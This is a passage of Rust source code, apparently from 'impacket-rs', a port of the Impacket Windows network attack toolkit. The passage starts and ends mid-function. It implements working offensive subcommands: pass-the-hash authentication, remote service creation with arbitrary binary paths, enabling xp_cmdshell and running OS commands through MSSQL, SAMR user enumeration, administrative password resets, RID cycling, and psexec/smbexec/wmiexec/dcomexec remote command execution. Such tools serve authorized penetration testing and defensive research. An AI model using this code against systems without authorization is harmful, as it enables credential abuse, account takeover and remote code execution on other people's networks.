                let svc_h = client.open_service(&scm, &name, scmr_access::SERVICE_QUERY_CONFIG)?;
                let cfg = client.query_service_config(&svc_h)?;
                println!("[+] Configuration for service '{}':", name);
                println!("  Display Name:     {}", cfg.display_name);
                println!("  Binary Path:      {}", cfg.binary_path);
                println!("  Start Type:       {} ({})", cfg.start_type, start_type_str(cfg.start_type));
                println!("  Service Type:     0x{:08X}", cfg.service_type);
                println!("  Error Control:    {} ({})", cfg.error_control, error_control_str(cfg.error_control));
                println!(
                    "  Start Name:       {}",
                    if cfg.service_start_name.is_empty() { "LocalSystem" } else { &cfg.service_start_name }
                );
                println!("  Load Order Group: {}", cfg.load_order_group);
                println!("  Tag ID:           {}", cfg.tag_id);
                println!("  Dependencies:     {}", cfg.dependencies);
                let _ = client.close_handle(&svc_h);
            }
            "start" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("start requires -name <service>".into()));
                }
                let svc_h = client.open_service(
                    &scm,
                    &name,
                    scmr_access::SERVICE_START | scmr_access::SERVICE_QUERY_STATUS,
                )?;
                println!("[*] Starting service '{}' ...", name);
                client.start_service(&svc_h)?;
                println!("[+] Service '{}' start request sent successfully.", name);
                let _ = client.close_handle(&svc_h);
            }
            "stop" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("stop requires -name <service>".into()));
                }
                let svc_h = client.open_service(
                    &scm,
                    &name,
                    scmr_access::SERVICE_STOP | scmr_access::SERVICE_QUERY_STATUS,
                )?;
                println!("[*] Stopping service '{}' ...", name);
                let st = client.control_service(&svc_h, scmr_access::SERVICE_CONTROL_STOP)?;
                println!("[+] Service '{}' stopped (state: {}).", name, st.state_str());
                let _ = client.close_handle(&svc_h);
            }
            "delete" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("delete requires -name <service>".into()));
                }
                let svc_h = client.open_service(&scm, &name, 0x0001_0000 /* DELETE */)?;
                println!("[*] Deleting service '{}' ...", name);
                client.delete_service(&svc_h)?;
                println!("[+] Service '{}' deleted successfully.", name);
                let _ = client.close_handle(&svc_h);
            }
            "create" => {
                if name.is_empty() || path.is_empty() {
                    return Err(CoreError::ProtocolError("create requires -name <service> and -path <binary_path>".into()));
                }
                let disp = if display.is_empty() { &name } else { &display };
                println!("[*] Creating service '{}' (Display: '{}', Path: '{}') ...", name, disp, path);
                let svc_h = client.create_service(
                    &scm,
                    &name,
                    Some(disp),
                    scmr_access::SERVICE_ALL_ACCESS,
                    service_type_val,
                    start_type_val,
                    scmr_access::SERVICE_ERROR_IGNORE,
                    &path,
                )?;
                println!("[+] Service '{}' created successfully.", name);
                let _ = client.close_handle(&svc_h);
            }
            "change" => {
                if name.is_empty() {
                    return Err(CoreError::ProtocolError("change requires -name <service>".into()));
                }
                let svc_h = client.open_service(&scm, &name, scmr_access::SERVICE_CHANGE_CONFIG)?;
                println!("[*] Changing configuration for service '{}' ...", name);
                client.change_service_config(
                    &svc_h,
                    service_type_val,
                    start_type_val,
                    0xFFFF_FFFF, // no error control change
                    if path.is_empty() { None } else { Some(&path) },
                    None,
                    if start_name.is_empty() { None } else { Some(&start_name) },
                    if display.is_empty() { None } else { Some(&display) },
                )?;
                println!("[+] Service '{}' configuration updated.", name);
                let _ = client.close_handle(&svc_h);
            }
            other => {
                return Err(CoreError::ProtocolError(format!(
                    "Unknown action '{}'. Valid actions: list, status, config, start, stop, delete, create, change",
                    other
                )));
            }
        }

        let _ = client.close_handle(&scm);
        Ok(())
    })();

    if let Err(e) = result {
        eprintln!("[-] services error: {}", e);
        std::process::exit(1);
    }
}

fn print_mssql_query_result(res: &QueryResult) {
    for msg in &res.messages {
        println!("{}", msg);
    }
    for err in &res.errors {
        eprintln!("[-] SQL Server Error {}: {}", err.number, err.message);
    }
    if !res.columns.is_empty() {
        let col_names: Vec<&str> = res.columns.iter().map(|c| c.name.as_str()).collect();
        println!("{}", col_names.join(" | "));
        let sep_len = col_names.iter().map(|n| n.len()).sum::<usize>()
            + col_names.len().saturating_sub(1) * 3;
        println!("{}", "-".repeat(sep_len.max(20)));
        for row in &res.rows {
            let row_strs: Vec<String> = row
                .values
                .iter()
                .map(|v| match v {
                    Some(s) => s.clone(),
                    None => "NULL".to_string(),
                })
                .collect();
            println!("{}", row_strs.join(" | "));
        }
        println!();
    }
    if res.rows_affected > 0 || res.columns.is_empty() {
        println!("({} rows affected)", res.rows_affected);
    }
}

fn cmd_mssqlclient(args: &[String]) {
    use std::io::{self, Write};

    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: mssqlclient <TARGET> [options]");
        println!();
        println!("Target Specification: [[domain/]user[:password]@]<host>");
        println!();
        println!("Options:");
        println!("  -port <PORT>        SQL Server TCP port (default: 1433)");
        println!("  -db <DATABASE>      Default database catalog (default: master)");
        println!("  -windows-auth       Force Windows Integrated Authentication (SSPI/NTLMv2)");
        println!("  -sql-auth           Force SQL Server native authentication");
        println!("  -hashes LM:NT       NTLM hash for Windows pass-the-hash authentication");
        println!("  -command \"<QUERY>\"  Execute SQL batch query and exit");
        println!();
        println!("Interactive Commands (when -command is omitted):");
        println!("  <SQL QUERY>         Execute SQL query / batch (e.g. SELECT @@VERSION)");
        println!("  use <db>            Switch active database context");
        println!("  enable_xp_cmdshell  Enable xp_cmdshell via sp_configure");
        println!("  disable_xp_cmdshell Disable xp_cmdshell via sp_configure");
        println!("  xp_cmdshell <cmd>   Execute operating system command via xp_cmdshell");
        println!("  help, ?             Show command help");
        println!("  exit, quit, q       Disconnect and exit");
        return;
    }

    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut port: u16 = 1433;
    let mut db = "master".to_string();
    let mut force_windows_auth = false;
    let mut force_sql_auth = false;
    let mut single_command: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-port" if i + 1 < args.len() => {
                port = args[i + 1].parse().unwrap_or(1433);
                i += 1;
            }
            "-db" | "-database" if i + 1 < args.len() => {
                db = args[i + 1].clone();
                i += 1;
            }
            "-windows-auth" => {
                force_windows_auth = true;
            }
            "-sql-auth" => {
                force_sql_auth = true;
            }
            "-command" | "-c" if i + 1 < args.len() => {
                single_command = Some(args[i + 1].clone());
                i += 1;
            }
            _ => {}
        }
        i += 1;
    }

    let use_windows_auth = if force_sql_auth {
        false
    } else if force_windows_auth {
        true
    } else {
        !spec.domain.is_empty() || spec.hashes.is_some() || spec.username.contains('\\')
    };

    let host = spec.effective_target_ip();
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to MSSQL at {} ...", addr);

    let mut client = match MssqlClient::connect(&addr) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] Connection failed: {}", e);
            std::process::exit(1);
        }
    };
    println!("[+] TDS handshake complete. Server: {}", client.server_name);

    let password_str = spec
        .password
        .as_ref()
        .map(|p| p.expose_secret())
        .unwrap_or("");

    if use_windows_auth {
        let domain = if spec.domain.is_empty() {
            if let Some((d, _)) = spec.username.split_once('\\') {
                d
            } else {
                ""
            }
        } else {
            &spec.domain
        };
        let user = spec.username.split('\\').last().unwrap_or(&spec.username);
        println!(
            "[*] Authenticating as Windows user '{}\\{}' (NTLMv2/SSPI) ...",
            domain, user
        );
        if let Err(e) = client.login_windows(
            domain,
            user,
            password_str,
            spec.hashes.as_ref(),
            &db,
        ) {
            eprintln!("[-] Login failed: {}", e);
            std::process::exit(1);
        }
    } else {
        println!("[*] Authenticating as SQL user '{}' ...", spec.username);
        if let Err(e) = client.login_sql(&spec.username, password_str, &db) {
            eprintln!("[-] Login failed: {}", e);
            std::process::exit(1);
        }
    }

    if let Some(ref ver) = client.server_version {
        println!("[+] Logged in successfully: {}", ver);
    } else {
        println!("[+] Logged in successfully (Database: {})", client.database);
    }

    if let Some(ref cmd) = single_command {
        match client.query(cmd) {
            Ok(res) => print_mssql_query_result(&res),
            Err(e) => {
                eprintln!("[-] Query execution failed: {}", e);
                std::process::exit(1);
            }
        }
        return;
    }

    println!("[*] Type 'help' for commands, 'exit' or 'quit' to disconnect.\n");
    let stdin = io::stdin();
    loop {
        print!("SQL ({})> ", client.database);
        let _ = io::stdout().flush();
        let mut line = String::new();
        if stdin.read_line(&mut line).unwrap_or(0) == 0 {
            break;
        }
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed.eq_ignore_ascii_case("exit")
            || trimmed.eq_ignore_ascii_case("quit")
            || trimmed.eq_ignore_ascii_case("q")
        {
            break;
        }
        if trimmed.eq_ignore_ascii_case("help") || trimmed == "?" {
            println!("MSSQL Client Commands:");
            println!("  <SQL QUERY>         Execute raw SQL query / batch (e.g. SELECT @@VERSION)");
            println!("  use <db>            Switch active database context");
            println!("  enable_xp_cmdshell  Enable xp_cmdshell stored procedure");
            println!("  disable_xp_cmdshell Disable xp_cmdshell stored procedure");
            println!("  xp_cmdshell <cmd>   Execute operating system command");
            println!("  exit, quit, q       Disconnect and exit");
            continue;
        }
        if trimmed.starts_with("use ") || trimmed.starts_with("USE ") {
            let target_db = trimmed[4..]
                .trim()
                .trim_matches(';')
                .trim_matches('[')
                .trim_matches(']');
            if let Err(e) = client.use_database(target_db) {
                eprintln!("[-] Failed switching database: {}", e);
            } else {
                println!("[+] Active database switched to '{}'", client.database);
            }
            continue;
        }
        if trimmed.eq_ignore_ascii_case("enable_xp_cmdshell") {
            match client.enable_xp_cmdshell() {
                Ok(()) => println!("[+] xp_cmdshell enabled successfully."),
                Err(e) => eprintln!("[-] Failed enabling xp_cmdshell: {}", e),
            }
            continue;
        }
        if trimmed.eq_ignore_ascii_case("disable_xp_cmdshell") {
            match client.disable_xp_cmdshell() {
                Ok(()) => println!("[+] xp_cmdshell disabled successfully."),
                Err(e) => eprintln!("[-] Failed disabling xp_cmdshell: {}", e),
            }
            continue;
        }
        if trimmed.starts_with("xp_cmdshell ") {
            let cmd = trimmed["xp_cmdshell ".len()..].trim();
            match client.xp_cmdshell(cmd) {
                Ok(lines) => {
                    for l in lines {
                        println!("{}", l);
                    }
                }
                Err(e) => eprintln!("[-] xp_cmdshell error: {}", e),
            }
            continue;
        }

        match client.query(trimmed) {
            Ok(res) => print_mssql_query_result(&res),
            Err(e) => eprintln!("[-] SQL Error: {}", e),
        }
    }
}

fn cmd_samrdump(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let result = (|| -> Result<(), CoreError> {
        let transport = open_pipe_transport(&spec, "samr", IFACE_SAMR)?;
        let mut client = SamrClient::new(transport);
        let server_name = format!(r"\\{}", spec.effective_target_ip());
        let server_handle = client.connect5(&server_name, 0x0000_0230)?;
        let domains = client.enumerate_domains(&server_handle)?;
        println!("[*] Found domain(s):");
        for d in &domains {
            println!(" . {}", d.name);
        }
        for d in &domains {
            if d.name.eq_ignore_ascii_case("Builtin") {
                continue;
            }
            let sid = client.lookup_domain(&server_handle, &d.name)?;
            println!("[*] Domain {} SID: {}", d.name, sid);
            let domain_handle = client.open_domain(&server_handle, 0x0000_0300, &sid)?;
            let users = client.enumerate_users(&domain_handle, 0)?;
            for u in &users {
                // USER_READ_GENERAL | USER_READ_PREFERENCES | USER_READ_LOGON | USER_READ_ACCOUNT.
                match client.open_user(&domain_handle, 0x0002_011B, u.relative_id) {
                    Ok(uh) => match client.query_user_all(&uh) {
                        Ok(info) => {
                            println!(
                                "{}\\{} (RID {}) group={} badpw={} logons={} pwLastSet={:?} neverExpires={} disabled={}",
                                d.name, info.username, info.user_id, info.primary_group_id,
                                info.bad_password_count, info.logon_count,
                                info.password_last_set.to_unix_secs(),
                                info.password_never_expires(), info.account_disabled(),
                            );
                            if !info.full_name.is_empty() {
                                println!("    FullName: {}", info.full_name);
                            }
                            if !info.admin_comment.is_empty() {
                                println!("    AdminComment: {}", info.admin_comment);
                            }
                        }
                        Err(e) => println!("{}\\{} (RID {}) [query failed: {}]", d.name, u.name, u.relative_id, e),
                    },
                    Err(e) => println!("{}\\{} (RID {}) [open failed: {}]", d.name, u.name, u.relative_id, e),
                }
            }
            println!("[*] Received {} users from {}.", users.len(), d.name);
        }
        Ok(())
    })();
    if let Err(e) = result {
        eprintln!("[-] samrdump error: {}", e);
        std::process::exit(1);
    }
}

fn cmd_changepasswd(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
        println!("Usage: impacket-rs changepasswd <TARGET> -new-pass <NEW> [options]");
        println!("       impacket-rs smbpasswd <TARGET> -new-pass <NEW> [options]");
        println!("  Change or reset user password via MS-SAMR (SMB TCP/445) or Kerberos kpasswd (TCP/464)");
        println!();
        println!("Options:");
        println!("  -new-pass <NEW>        New password to set");
        println!("  -old-pass <OLD>        Old password (if performing self-service change)");
        println!("  -protocol samr|kpasswd Protocol to use (default: samr)");
        println!("  -hashes LM:NT          NTLM pass-the-hash authentication");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] usage: changepasswd <TARGET> -new-pass <NEW> [-old-pass <OLD>] [-protocol samr|kpasswd] [-port <PORT>]");
            eprintln!("[-] error: {}", e);
            std::process::exit(1);
        }
    };

    let mut old_pass: Option<String> = spec.password.as_ref().map(|p| p.expose_secret().to_string());
    let mut new_pass: Option<String> = None;
    let mut protocol = "samr".to_string();
    let mut port: Option<u16> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-old-pass" | "-old" => {
                if i + 1 < args.len() {
                    old_pass = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-new-pass" | "-new" => {
                if i + 1 < args.len() {
                    new_pass = Some(args[i + 1].clone());
                    i += 1;
                }
            }
            "-protocol" | "-proto" => {
                if i + 1 < args.len() {
                    protocol = args[i + 1].to_ascii_lowercase();
                    i += 1;
                }
            }
            "-port" => {
                if i + 1 < args.len() {
                    port = args[i + 1].parse().ok();
                    i += 1;
                }
            }
            _ => {}
        }
        i += 1;
    }

    let new_password = match new_pass {
        Some(p) => p,
        None => {
            eprintln!("[-] error: missing -new-pass <NEW_PASSWORD>");
            std::process::exit(1);
        }
    };

    let host = spec.effective_target_ip();

    if protocol == "kpasswd" {
        let kdc_port = port.unwrap_or(464);
        println!("[*] Using Kerberos kpasswd protocol against {}:{}...", host, kdc_port);

        let nt_hash = if let Some(ref h) = spec.hashes {
            h.nt
        } else if let Some(ref old) = old_pass {
            compute_ntlm_hashes(old).nt
        } else {
            eprintln!("[-] error: Kerberos kpasswd requires existing credentials: provide old password (user:pass@host or -old-pass) or -hashes LM:NT");
            std::process::exit(1);
        };

        let now_unix = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as i64;

        // Step 1: Request TGT
        println!("[*] Requesting TGT from {}:88 for {}@{}...", host, spec.username, spec.domain);
        let as_rep = match get_tgt_live(host, 88, &spec.domain, &spec.username, &nt_hash, DEFAULT_TIMEOUT) {
            Ok(rep) => rep,
            Err(e) => {
                eprintln!("[-] Failed requesting TGT: {}", e);
                std::process::exit(1);
            }
        };

        let tgt_session = match as_rep.decrypt_tgt_session(&nt_hash) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[-] Failed decrypting TGT session: {}", e);
                std::process::exit(1);
            }
        };

        // Step 2: Request TGS for kadmin/changepw
        println!("[*] Requesting Service Ticket for kadmin/changepw...");
        let requested_etypes = [
            KerberosEType::Rc4Hmac,
            KerberosEType::Aes256CtsHmacSha1_96,
            KerberosEType::Aes128CtsHmacSha1_96,
        ];
        let tgs_req = Krb5TgsReq::new(
            &spec.domain,
            &spec.username,
            "kadmin/changepw",
            &tgt_session.tgt_ticket,
            &tgt_session.session_key,
            tgt_session.session_key_etype,
            &requested_etypes,
        );

        let tgs_rep = match get_tgs_live(host, 88, &tgs_req, now_unix, DEFAULT_TIMEOUT) {
            Ok(rep) => rep,
            Err(e) => {
                eprintln!("[-] Failed requesting Service Ticket for kadmin/changepw: {}", e);
                std::process::exit(1);
            }
        };

        let (srv_etype, srv_key) = match tgs_rep.decrypt_session_key(&tgt_session.session_key, tgt_session.session_key_etype) {
            Ok(k) => k,
            Err(e) => {
                eprintln!("[-] Failed decrypting Service Ticket session key: {}", e);
                std::process::exit(1);
            }
        };

        // Step 3: Send KPASSWD request
        println!("[*] Sending password change request via kpasswd (TCP/{})...", kdc_port);
        match change_password_kpasswd_live(
            host,
            kdc_port,
            &tgs_rep.ticket_raw,
            &srv_key,
            srv_etype,
            &spec.username,
            &spec.domain,
            &new_password,
            now_unix,
            DEFAULT_TIMEOUT,
        ) {
            Ok(resp) => {
                if resp.result_code == KpasswdResultCode::Success {
                    println!("[+] Password for {}@{} changed successfully!", spec.username, spec.domain);
                } else {
                    eprintln!("[-] KPASSWD rejected: {} - {}", resp.result_code.description(), resp.result_string);
                    std::process::exit(1);
                }
            }
            Err(e) => {
                eprintln!("[-] kpasswd communication error: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        // Default protocol: SAMR
        println!("[*] Using MS-SAMR protocol against \\PIPE\\samr on {}...", host);

        if let Some(ref old) = old_pass {
            // User changing own password via SamrUnicodeChangePasswordUser2 (Opnum 55)
            println!("[*] Executing SamrUnicodeChangePasswordUser2 (unprivileged password change)...");
            let transport = match open_pipe_transport(&spec, "samr", IFACE_SAMR) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\samr: {}", e);
                    std::process::exit(1);
                }
            };
            let mut client = SamrClient::new(transport);
            let server_name = format!(r"\\{}", host);
            match client.unicode_change_password_user2(&server_name, &spec.username, old, &new_password) {
                Ok(()) => {
                    println!("[+] Password for {} changed successfully via SamrUnicodeChangePasswordUser2!", spec.username);
                }
                Err(e) => {
                    eprintln!("[-] SamrUnicodeChangePasswordUser2 failed: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            // Administrative password reset via SamrSetInformationUser2 (Opnum 58)
            println!("[*] Executing administrative password reset via SamrSetInformationUser2...");
            let transport = match open_pipe_transport(&spec, "samr", IFACE_SAMR) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("[-] Failed connecting to \\PIPE\\samr: {}", e);
                    std::process::exit(1);
                }
            };
            let session_key = *transport.session_key();
            let mut client = SamrClient::new(transport);
            let server_name = format!(r"\\{}", host);
            let server_handle = match client.connect5(&server_name, 0x0000_0230) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrConnect5 failed: {}", e);
                    std::process::exit(1);
                }
            };

            let domains = match client.enumerate_domains(&server_handle) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("[-] SamrEnumerateDomains failed: {}", e);
                    std::process::exit(1);
                }
            };

            let domain_name = domains
                .into_iter()
                .map(|d| d.name)
                .find(|n| !n.eq_ignore_ascii_case("Builtin"))
                .unwrap_or_else(|| spec.domain.clone());

            let domain_sid = match client.lookup_domain(&server_handle, &domain_name) {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[-] SamrLookupDomain failed: {}", e);
                    std::process::exit(1);
                }
            };

            let domain_handle = match client.open_domain(&server_handle, 0x0000_0200, &domain_sid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrOpenDomain failed: {}", e);
                    std::process::exit(1);
                }
            };

            // Enumerate domain users to find target user RID
            println!("[*] Resolving user RID for '{}'...", spec.username);
            let users = match client.enumerate_users(&domain_handle, 0) {
                Ok(u) => u,
                Err(e) => {
                    eprintln!("[-] SamrEnumerateUsers failed: {}", e);
                    std::process::exit(1);
                }
            };

            let user_entry = users.into_iter().find(|u| u.name.eq_ignore_ascii_case(&spec.username));
            let rid = match user_entry {
                Some(u) => u.relative_id,
                None => {
                    eprintln!("[-] User '{}' not found in domain '{}'", spec.username, domain_name);
                    std::process::exit(1);
                }
            };

            println!("[*] Found user '{}' with RID {}", spec.username, rid);
            let access_mask = samr_user_access::USER_FORCE_PASSWORD_CHANGE | samr_user_access::USER_SET_PASSWORD;
            let user_handle = match client.open_user(&domain_handle, access_mask, rid) {
                Ok(h) => h,
                Err(e) => {
                    eprintln!("[-] SamrOpenUser failed: {}", e);
                    std::process::exit(1);
                }
            };

            println!("[*] Setting new password using transport session key...");
            match client.set_user_password(&user_handle, &new_password, &session_key) {
                Ok(()) => {
                    println!("[+] Password for {} reset successfully via SamrSetInformationUser2!", spec.username);
                }
                Err(e) => {
                    eprintln!("[-] SamrSetInformationUser2 failed: {}", e);
                    std::process::exit(1);
                }
            }
        }
    }
}

fn cmd_lookupsid(args: &[String]) {
    print!("{}", version::BANNER);
    if args.is_empty() {
        println!("Usage: lookupsid <TARGET> [-hashes LM:NT] [-rights] [maxRid]");
        println!();
        println!("Options:");
        println!("  -rights            Query and display privileges/rights (MS-LSAD LsarEnumerateAccountRights) for each resolved SID");
        println!("  maxRid             Maximum RID to enumerate (default: 1100)");
        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
        return;
    }
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let show_rights = args.iter().any(|a| a == "-rights" || a == "-privs");
    // Optional trailing maxRid (bare numeric arg).
    let max_rid: u32 = args
        .iter()
        .skip(1)
        .find_map(|a| a.parse::<u32>().ok())
        .unwrap_or(1100);

    let result = (|| -> Result<(), CoreError> {
        // Discover the account-domain SID over SAMR, then resolve RIDs over LSAT.
        let (domain_name, domain_sid) = samr_account_domain(&spec)?;
        println!("[*] Domain SID is: {} ({})", domain_sid, domain_name);

        let transport = open_pipe_transport(&spec, "lsarpc", IFACE_LSAT)?;
        let mut lsat = LsatClient::new(transport, spec.compat_profile);
        let system_name = format!(r"\\{}", spec.effective_target_ip());
        let policy = lsat.open_policy(&system_name, 0x0200_0000)?;

        let mut sids = Vec::new();
        for rid in 500..=max_rid {
            let mut s = domain_sid.clone();
            s.sub_authorities.push(rid);
            sids.push(s);
        }
        // Resolve in batches; each batch's results line up with its RID range.
        let mut resolved = 0usize;
        for (batch_idx, chunk) in sids.chunks(64).enumerate() {
            let names = lsat.lookup_sids(&policy, chunk)?;
            for (i, n) in names.iter().enumerate() {
                if n.name.is_empty() || n.sid_type == impacket_msrpc::SidNameUse::Unknown {
                    continue;
                }
                let rid = 500 + (batch_idx * 64 + i) as u32;
                println!("{}: {}\\{} ({})", rid, n.domain, n.name, n.sid_type.name());
                if show_rights {
                    let principal_sid = &chunk[i];
                    if let Ok(rights) = lsat.enumerate_account_rights(&policy, principal_sid) {
                        if !rights.is_empty() {
                            println!("    Privileges/Rights: {}", rights.join(", "));
                        }
                    }
                }
                resolved += 1;
            }
        }
        println!("[*] Resolved {} principals.", resolved);
        Ok(())
    })();
    if let Err(e) = result {
        eprintln!("[-] lookupsid error: {}", e);
        std::process::exit(1);
    }
}

/// Extracts the first positional arg after the target that is not part of a known `-flag value` pair.
fn positional_after_target(args: &[String]) -> Option<String> {
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-hashes" | "--compat" | "-compat" | "-port" => i += 2,
            _ => return Some(args[i].clone()),
        }
    }
    None
}

/// Extracts all positional args after the target, skipping `-flag value` pairs.
fn positionals_after_target(args: &[String]) -> Vec<String> {
    let mut out = Vec::new();
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-hashes" | "--compat" | "-compat" | "-port" => i += 2,
            _ => {
                out.push(args[i].clone());
                i += 1;
            }
        }
    }
    out
}

fn format_size(bytes: u64) -> String {
    const KB: u64 = 1024;
    const MB: u64 = 1024 * KB;
    const GB: u64 = 1024 * MB;
    if bytes >= GB {
        format!("{:.1} GB", bytes as f64 / GB as f64)
    } else if bytes >= MB {
        format!("{:.1} MB", bytes as f64 / MB as f64)
    } else if bytes >= KB {
        format!("{:.1} KB", bytes as f64 / KB as f64)
    } else {
        format!("{} B", bytes)
    }
}

fn format_filetime(ft: FileTime) -> String {
    match ft.to_unix_secs() {
        Some(secs) if secs > 0 => {
            let days = (secs / 86400) as i64;
            let time_in_day = secs % 86400;
            let hours = time_in_day / 3600;
            let mins = (time_in_day % 3600) / 60;
            let s = time_in_day % 60;
            let z = days + 719468;
            let era = (if z >= 0 { z } else { z - 146096 }) / 146097;
            let doe = (z - era * 146097) as u32;
            let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
            let y = yoe as i64 + era * 400;
            let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
            let mp = (5 * doy + 2) / 153;
            let d = doy - (153 * mp + 2) / 5 + 1;
            let m = if mp < 10 { mp + 3 } else { mp - 9 };
            let year = if m <= 2 { y + 1 } else { y };
            format!("{:04}-{:02}-{:02} {:02}:{:02}:{:02}", year, m, d, hours, mins, s)
        }
        _ => "N/A".to_string(),
    }
}

fn display_directory_listing(entries: &[impacket_smb::SmbDirectoryEntry]) {
    println!("{:<6} {:>10}  {:<19}  {}", "Type", "Size", "Last Modified", "Name");
    println!("{:-<6} {:-<10}  {:-<19}  {:-<20}", "", "", "", "");
    for e in entries {
        let type_str = if e.is_directory { "<DIR>" } else { "FILE" };
        let size_str = if e.is_directory { String::new() } else { format_size(e.end_of_file) };
        let date_str = format_filetime(e.last_write_time);
        println!("{:<6} {:>10}  {:<19}  {}", type_str, size_str, date_str, e.name);
    }
    println!("[*] {} entries.", entries.len());
}

fn cmd_smbexec(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let command = match positional_after_target(args) {
        Some(c) => c,
        None => {
            eprintln!("[-] smbexec needs a command: smbexec <TARGET> \"<command>\" [-hashes :NT]");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    match impacket_msrpc::exec::smbexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &command,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            print!("{}", output);
            if !output.ends_with('\n') {
                println!();
            }
        }
        Err(e) => {
            eprintln!("[-] smbexec error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_psexec(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let command = match positional_after_target(args) {
        Some(c) => c,
        None => {
            eprintln!("[-] psexec needs a command: psexec <TARGET> \"<command>\" [-share ADMIN$] [-hashes :NT]");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut custom_share: Option<&str> = None;
    let mut i = 0;
    while i < args.len() {
        if args[i] == "-share" && i + 1 < args.len() {
            custom_share = Some(&args[i + 1]);
            i += 2;
        } else {
            i += 1;
        }
    }

    match impacket_msrpc::psexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &command,
        custom_share,
        None,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            print!("{}", output);
            if !output.ends_with('\n') {
                println!();
            }
        }
        Err(e) => {
            eprintln!("[-] psexec error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_wmiexec(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let command = match positional_after_target(args) {
        Some(c) => c,
        None => {
            eprintln!("[-] wmiexec needs a command: wmiexec <TARGET> \"<command>\" [-share ADMIN$] [-hashes :NT]");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut custom_share: Option<&str> = None;
    let mut i = 0;
    while i < args.len() {
        if args[i] == "-share" && i + 1 < args.len() {
            custom_share = Some(&args[i + 1]);
            i += 2;
        } else {
            i += 1;
        }
    }

    match impacket_msrpc::wmiexec(
        spec.effective_target_ip(),
        &spec.domain,
        &spec.username,
        &cred,
        &command,
        custom_share,
        spec.compat_profile,
        DEFAULT_TIMEOUT,
    ) {
        Ok(output) => {
            print!("{}", output);
            if !output.ends_with('\n') {
                println!();
            }
        }
        Err(e) => {
            eprintln!("[-] wmiexec error: {}", e);
            std::process::exit(1);
        }
    }
}

fn cmd_dcomexec(args: &[String]) {
    print!("{}", version::BANNER);
    let spec = match parse_target_with_hashes(args) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };
    let command = match positional_after_target(args) {
        Some(c) => c,
        None => {
            eprintln!("[-] dcomexec needs a command: dcomexec <TARGET> \"<command>\" [-object mmc20|shellwindows|shellbrowserwindow] [-share ADMIN$]");
            std::process::exit(1);
        }
    };
    let cred = match credential_from(&spec) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[-] {}", e);
            std::process::exit(1);
        }
    };

    let mut custom_share: Option<&str> = None;
    let mut object = impacket_msrpc::DcomObject::Mmc20;
    let mut i = 0;
    while i < args.len() {
        if args[i] == "-share" && i + 1 < args.len() {
            custom_share = Some(&args[i + 1]);
            i += 2;
        } else if args[i] == "-object" && i + 1 < args.len() {
            let obj_str = args[i + 1].to_lowercase();
            if obj_str.contains("shellwindows") {
                object = impacket_msrpc::DcomObject::ShellWindows;
